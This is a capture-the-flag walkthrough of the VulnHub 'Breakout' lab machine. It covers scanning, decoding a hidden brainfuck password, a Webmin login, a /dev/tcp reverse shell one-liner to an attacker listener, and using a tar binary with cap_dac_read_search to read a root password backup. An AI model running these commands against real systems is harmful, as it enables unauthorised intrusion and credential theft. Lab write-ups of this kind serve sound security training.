# Breakout

Welcome to my detailed walkthrough of the "Breakout" machine, which you can download from [VulnHub](https://www.vulnhub.com/entry/empire-breakout,751/). This tutorial is designed to meticulously explain the process of exploiting this machine, encompassing everything from initial reconnaissance to achieving elevated privileges.

## Enumeration

### Nmap Scan

Our exploration commences with an Nmap scan, aimed at identifying open ports and active services:

```
nmap -sCV -p- 192.168.75.131
```
#### Scan Results

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-29 21:33 GMT
Nmap scan report for 192.168.75.131
Host is up (0.00096s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.51 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.51 (Debian)
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
10000/tcp open  http        MiniServ 1.981 (Webmin httpd)
|_http-title: 200 &mdash; Document follows
20000/tcp open  http        MiniServ 1.830 (Webmin httpd)
|_http-title: 200 &mdash; Document follows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: BREAKOUT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2024-01-29T21:33:39
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.96 seconds
```
The scan reveals the presence of five open ports: `Port 80` operating an Apache web server, `Ports 139` and `445` running `Samba SMB services`, and `Ports 10000` and `20000` hosting `MiniServ`.

These results offer crucial insights into the network landscape of the target machine.

### Web Server Enumeration

Unfortunately, the webserver only displays the default Apache page.

![image](https://github.com/vsang181/VulnHub/assets/28651683/19324937-ff7f-4e9b-aebd-f015213446a9)

However, to ensure nothing is overlooked, I delved into the `source code`. At the bottom, hidden in a sea of empty lines, was a comment.

![image](https://github.com/vsang181/VulnHub/assets/28651683/d46946fd-7551-46bf-bf33-8b98929aab47)

This appeared to be some encrypted text. To decrypt it, I used the cipher identification tool on [dcode.fr](https://www.dcode.fr/cipher-identifier), which suggested it might be `brainfuck` encryption.

![image](https://github.com/vsang181/VulnHub/assets/28651683/aa197407-2341-4d74-8d15-30324bb54d09)

To decode this, I wrote a simple Python decoder:

```
def run_brainfuck(code, input_string=''):
    code = list(filter(lambda x: x in ['>', '<', '+', '-', '.', ',', '[', ']'], code))
    tape = [0] * 30000
    ptr = 0
    code_ptr = 0
    input_ptr = 0
    output = ''
    code_length = len(code)

    brace_map = {}
    left_brace_stack = []

    for i, c in enumerate(code):
        if c == '[':
            left_brace_stack.append(i)
        elif c == ']':
            left_idx = left_brace_stack.pop()
            right_idx = i
            brace_map[left_idx] = right_idx
            brace_map[right_idx] = left_idx

    while code_ptr < code_length:
        command = code[code_ptr]

        if command == '>':
            ptr += 1
        elif command == '<':
            ptr -= 1
        elif command == '+':
            tape[ptr] = (tape[ptr] + 1) % 256
        elif command == '-':
            tape[ptr] = (tape[ptr] - 1) % 256
        elif command == '.':
            output += chr(tape[ptr])
        elif command == ',':
            if input_ptr < len(input_string):
                tape[ptr] = ord(input_string[input_ptr])
                input_ptr += 1
            else:
                tape[ptr] = 0
        elif command == '[':
            if tape[ptr] == 0:
                code_ptr = brace_map[code_ptr]
        elif command == ']':
            if tape[ptr] != 0:
                code_ptr = brace_map[code_ptr]

        code_ptr += 1

    return output

brainfuck_code = "++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++."
print(run_brainfuck(brainfuck_code))
```

Running this script yielded text that seemed like a `password `or `key`. 

![image](https://github.com/vsang181/VulnHub/assets/28651683/b7700df8-7e04-4d49-b3f3-6dbf2315f6f7)

Its use wasn't immediately clear, so I set it aside for now and continued exploring other services on the machine.

### Enumerting Samba server

For the Samba server, I used [enum4linux](https://github.com/CiscoCXSecurity/enum4linux) a tool that simplifies data extraction from `Windows` and `Samba hosts`. 

This led to the discovery of a `username` in the local groups.

![image](https://github.com/vsang181/VulnHub/assets/28651683/d6bd832a-83a8-4253-9c92-fe07482763db)

This is promising so far as we have found a `username` and a `password`.

### Enumerating Other services

Port 10000 revealed a `web admin login portal`, where our previously discovered credentials were ineffective.

![image](https://github.com/vsang181/VulnHub/assets/28651683/077c8a63-6cab-4748-9c19-0a1071fc472e)

However, on `Port 20000` with the eaxcat same `web admin login portal`, these credentials granted access.

![image](https://github.com/vsang181/VulnHub/assets/28651683/7ea9e524-a4ec-4969-bdcf-97b2694fb995)

## Exploitation

The web page on Port 20000 seemed partially functional.

Further investigation led to a `CLI interpreter`.

![image](https://github.com/vsang181/VulnHub/assets/28651683/5387227e-51dd-4f60-8dc6-635fe3c51d14)

Which provided a shell access as the user `cyber`.

![image](https://github.com/vsang181/VulnHub/assets/28651683/ccbbc571-5c3a-4680-91a0-b001d4b3dbc8)

Using this, I captured the `user flag`.

## Priviledge Esacalation

Firstly, let's establish a `robust reverse shell` on our system using the available CLI:

```
sh -i >& /dev/tcp/192.168.75.128/9001 0>&1
```

![image](https://github.com/vsang181/VulnHub/assets/28651683/bab44988-850e-4501-82a8-25dc12fa2645)

Next, we enhance our shell using Python:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![image](https://github.com/vsang181/VulnHub/assets/28651683/d2d4a2e6-307b-4378-999f-f24b303a5c65)

Attempting to run `sudo -l` results in an error indicating the absence of the `sudo command`.

![image](https://github.com/vsang181/VulnHub/assets/28651683/a502c8c8-6ab4-439b-9e94-72ac7d1be918)

However, a simple `ls` command reveals another file named `tar` in the same directory as the `user.txt` file, which contains the user flag. Let's examine this file more closely.

![image](https://github.com/vsang181/VulnHub/assets/28651683/74a27fd5-4145-4ed6-ab15-072e50c9fd91)

It appears we've discovered an `executable file`. 

We'll check its permissions:

![image](https://github.com/vsang181/VulnHub/assets/28651683/bfd75573-1559-46ad-85c4-945e25b73774)

It turns out we have execution permissions for this file. Using the `cat` command on this file only returns gibberish, as it is an executable.

Let's try using the `--help` command:

![image](https://github.com/vsang181/VulnHub/assets/28651683/80853f23-d305-477a-b8a0-7929294dd47b)

This is intriguing as it suggests we can compress any file into a single archive.

To understand the capabilities of this executable, we use the `getcap` command:

![image](https://github.com/vsang181/VulnHub/assets/28651683/252cda7f-d8ac-46f6-85fb-f49b06aaf3fe)

A quick Google search reveals that `cap_dac_read_search` allows for reading files without proper permissions, as detailed on the [linux manual](https://man7.org/linux/man-pages/man7/capabilities.7.html) page.

![image](https://github.com/vsang181/VulnHub/assets/28651683/d3a40822-03a2-4059-985f-eef3e3c915b5)

After scouring the system for files with noteworthy permissions that could be exploited using our executable, a particular file in `/var/backups` caught my attention.

![image](https://github.com/vsang181/VulnHub/assets/28651683/ac43664d-7df1-4540-9f01-cbccc4aa0dbe)

As the user `cyber`, we lack the permissions to read it directly. 

So, let's use the executable found in our user's home directory to access it. 

We'll start by wrapping it in a `tar` file:

```
./tar -cf old_pass.tar /var/backups/.old_pass.bak
```

With the `old_pass.tar` file created, let's attempt to read its contents.

First, we extract the file:

```
tar -xf old_pass.tar
```

This extraction leads us to a new directory named `var`.

Within `var`, we find another directory called `backups`.

Finally, this leads us to the `old_pass.bak` file.

Reading this file reveals a password.

![image](https://github.com/vsang181/VulnHub/assets/28651683/f0365909-0186-48cb-982b-680c38e4e7bd)

Let's attempt to use this as the root password. 

Since the sudo command isn't available, we'll use `su`:

```
su -
```

And with that, we gain a root shell.

![image](https://github.com/vsang181/VulnHub/assets/28651683/0a415c61-266d-4b7c-9eb1-235fa9592e7b)

This successful maneuver grants us access to the root flag.

![image](https://github.com/vsang181/VulnHub/assets/28651683/1bce0c6e-ce1d-4013-bb07-0df694b0e97f)
